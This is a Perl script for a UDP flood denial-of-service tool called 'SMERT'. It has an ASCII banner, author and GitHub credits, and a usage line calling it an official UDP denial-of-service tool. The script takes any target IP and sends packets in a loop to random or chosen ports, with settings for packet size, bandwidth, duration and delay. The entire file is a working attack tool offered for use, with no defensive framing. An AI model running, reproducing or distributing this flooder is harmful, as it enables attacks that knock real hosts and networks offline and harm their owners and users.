#!/usr/bin/perl
#####################################################
# udp SMERT flood.
######################################################

use Socket;
use strict;
use Getopt::Long;
use Time::HiRes qw( usleep gettimeofday ) ;

our $port = 0;
our $size = 0;
our $time = 0;
our $bw   = 0;
our $help = 0;
our $delay= 0;

GetOptions(
	"port=i" => \$port,		# UDP port to use, numeric, 0=random
	"size=i" => \$size,		# packet size, number, 0=random
	"bandwidth=i" => \$bw,		# bandwidth to consume
	"time=i" => \$time,		# time to run
	"delay=f"=> \$delay,		# inter-packet delay
	"help|?" => \$help);		# help
	

my ($ip) = @ARGV;

if ($help || !$ip) {
  print <<'EOL';
                        .         .                                                           
      d888888o.           ,8.       ,8.          8 8888888888   8 888888888o. 8888888 8888888888 
    .`8888:' `88.        ,888.     ,888.         8 8888         8 8888    `88.      8 8888       
    8.`8888.   Y8       .`8888.   .`8888.        8 8888         8 8888     `88      8 8888       
    `8.`8888.          ,8.`8888. ,8.`8888.       8 8888         8 8888     ,88      8 8888       
     `8.`8888.        ,8'8.`8888,8^8.`8888.      8 888888888888 8 8888.   ,88'      8 8888       
      `8.`8888.      ,8' `8.`8888' `8.`8888.     8 8888         8 888888888P'       8 8888       
       `8.`8888.    ,8'   `8.`88'   `8.`8888.    8 8888         8 8888`8b           8 8888       
   8b   `8.`8888.  ,8'     `8.`'     `8.`8888.   8 8888         8 8888 `8b.         8 8888       
   `8b.  ;8.`8888 ,8'       `8        `8.`8888.  8 8888         8 8888   `8b.       8 8888   
    `Y8888P ,88P',8'         `         `8.`8888. 8 888888888888 8 8888     `88.     8 8888       

                | 83 77 69 82 39 84 |

 this tool has powered by Gabriel Packy

 Oficial Udp Denial of Service of Smert

 use:
 perl smertdos.pl [IP] [PORT] 65500

 https://github.com/gblpcky

EOL
  exit(1);
}

if ($bw && $delay) {
  print "WARNING: computed packet size overwrites the --size parameter ignored\n";
  $size = int($bw * $delay / 8);
} elsif ($bw) {
  $delay = (8 * $size) / $bw;
}

$size = 256 if $bw && !$size;

($bw = int($size / $delay * 8)) if ($delay && $size);

my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Can't resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "Flooding The IP: $ip " . ($port ? $port : "By:") . " Gabriel Packy " . 
  ($size ? "$size-byte" : "UDP Oficial da: OnFall Team") . " https://github.com/gblpcky" . ($time ? " for $time seconds" : "") . "\n";
print "Interpacket delay $delay msec\n" if $delay;
print "total IP bandwidth $bw kbps\n" if $bw;
print "Para parar use Ctrl+C\n" unless $time;

die "Invalid packet size requested: $size\n" if $size && ($size < 64 || $size > 1500);
$size -= 28 if $size;
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
  usleep(1000 * $delay) if $delay;
}